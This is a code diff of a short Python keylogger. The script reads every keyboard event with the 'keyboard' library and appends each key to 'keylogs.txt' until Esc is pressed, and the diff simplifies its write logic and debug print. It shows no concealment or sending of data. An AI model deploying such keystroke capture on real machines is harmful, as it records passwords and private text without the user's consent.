@@ -5,18 +5,13 @@ def main():
     with open("keylogs.txt", "a") as f:
         while True:
             event = keyboard.read_event()
-            
-            if event.name == 'esc': # If the key is Esc, stop the loop.
+            if event.name == 'esc':
                 break
-            
-            try:
-                key_repr = str(event.name) # Try getting the representation of the key.
-            except AttributeError: # If it's not a special key.
-                key_repr = event.name.char 
-            
-            print("Key pressed:", key_repr) # Debug print statement.
-            f.write(key_repr) # Write the representation to the file.
-            f.flush() # Flush the buffer to ensure changes are written to disk.
+            elif len(event.name) > 1 or event.name.isalnum():
+                f.write(str(event.name))
+            else:
+                f.write(event.name)
+            print(f"Key {event.name} was pressed")
 
 if __name__ == "__main__":
     main()
